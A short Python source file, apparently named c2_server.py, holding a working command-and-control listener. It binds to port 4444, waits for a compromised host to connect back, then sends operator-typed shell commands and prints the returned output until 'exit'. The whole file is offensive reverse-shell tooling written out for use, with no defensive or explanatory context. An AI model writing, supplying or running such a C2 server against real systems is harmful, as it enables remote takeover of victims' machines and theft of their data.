# c2_server.py
import socket
import sys

def start_server(host='0.0.0.0', port=4444):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((host, port))
    server.listen(1)
    print(f"[*] Listening for incoming connections on {host}:{port}...")

    conn, addr = server.accept()
    print(f"[+] Connection established from {addr[0]}:{addr[1]}")

    while True:
        try:
            command = input("C2-Shell> ")
            if not command.strip():
                continue
            
            if command.lower() == 'exit':
                conn.send(b'exit')
                break
            
            if command.lower() == 'clear':
                print("\n" * 100)
                continue

            conn.send(command.encode())
            
            # Receive data in chunks
            result = b""
            while True:
                data = conn.recv(4096)
                if not data:
                    break
                result += data
                if result.endswith(b"END_OF_OUTPUT"):
                    break
            
            print(result.replace(b"END_OF_OUTPUT", b"").decode(errors='replace'))
            
        except Exception as e:
            print(f"[-] Error: {e}")
            break

    conn.close()
    server.close()

if __name__ == "__main__":
    start_server()
